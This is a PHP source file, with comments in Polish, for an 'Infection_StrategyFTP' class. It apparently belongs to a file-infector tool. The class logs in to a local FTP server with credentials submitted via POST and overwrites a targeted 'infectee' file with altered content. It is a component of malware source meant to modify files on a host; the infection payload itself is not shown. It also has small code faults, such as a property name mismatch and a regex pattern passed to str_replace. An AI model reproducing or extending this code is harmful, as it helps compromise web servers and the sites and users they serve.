<?php

class Infection_StrategyFTP extends Infection_Strategy
{
	private
		$connection;

	function save()
	{
		$memory = fopen('php://memory', 'w+');
		fwrite($memory, $this -> infectee -> text());
		rewind($memory);
		
		if(!ftp_fput($this -> ftp_connection, $this -> ftp_path(), $memory, FTP_ASCII))
		{
			fclose($memory);
			throw new LogicException('Saving through FTP failed');
		}
		fclose($memory);
	}

	private function ftp_directory_is_valid()
	{
		$ftp_directory	= $this -> ftp_directory();
		$ftp_filename	= Collection::unique_string();
		$absolute_path	= str_replace('/\/+/', '/', $ftp_directory . '/' . $ftp_filename);

		return
			ftp_fput($this -> ftp_connection, $ftp_filename, tmpfile(), FTP_ASCII) && // tmpfile() zamiast fopen itd. z racji krotszego kodu
			file_exists($absolute_path) &&
			ftp_delete($this -> ftp_connection, $ftp_filename)
		;
	}

	private function ftp_path()
	{
		return Collection::remove_string_beginning($this -> infectee -> getpathname(), $this -> ftp_directory());
	}

	private function ftp_directory()
	{
		return isset($_POST['ftp_directory']) ? $_POST['ftp_directory'] : null; // zakladamy, ze system FTP to system FS (a przynajmniej jedna z jego galezi, w zaden sposob nie zmodyfikowana, ale odcieta) i korzen drzewa FTP to galaz drzewa FS
	}

	function __construct()
	{
		switch(false)
		{
			case $this -> ftp_connection = ftp_connect('localhost', 0, 10): // port domyslny, timeout 10
			case ftp_login($this -> ftp_connection, $_POST['ftp_username'], $_POST['ftp_password']):
			case ftp_chdir($this -> ftp_connection, '/'):
				throw new LogicException('FTP connection failed');
			case $this -> ftp_directory_is_valid():
				throw new LogicException('Incorrect FTP directory was given, please respecify it');
		}
	}

	function __destruct()
	{
		if($this -> ftp_connection)
		{
			ftp_close($this -> ftp_connection); // niewazne, ze moze zawiesc. i tak konczymy dzialanie. zapobiegamy tylko bledom wyswietlalnym
		}
	}
}

?>